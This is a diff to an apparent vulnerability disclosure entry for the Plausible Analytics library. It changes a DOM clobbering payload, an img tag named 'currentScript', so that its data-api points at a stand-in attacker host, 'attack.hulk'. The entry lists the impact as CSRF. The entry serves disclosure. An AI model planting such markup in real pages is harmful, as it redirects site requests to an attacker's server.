@@ -6,7 +6,7 @@
 + Stars: 19.7K
 + Version: v2.1.0
 + Fingerprint: `window.plausible !== undefined`
-+ Payload: ```<img name="currentScript" data-domain="xxx.xxx.xxx" data-api="https://xxx.xxx.xxx">```
++ Payload: ```<img name="currentScript" data-domain="attack.hulk" data-api="https://attack.hulk">```
 + Impact: CSRF
 + CVE: N/A
 + Status: Reported
@@ -64,7 +64,7 @@ https://github.com/plausible/analytics
 <!--Library-->
 
 <!--Payload-->
-<img name="currentScript" data-domain="xxx.xxx.xxx" data-api="https://xxx.xxx.xxx">
+<img name="currentScript" data-domain="attack.hulk" data-api="https://attack.hulk">
 <!--Payload-->
 ```
 
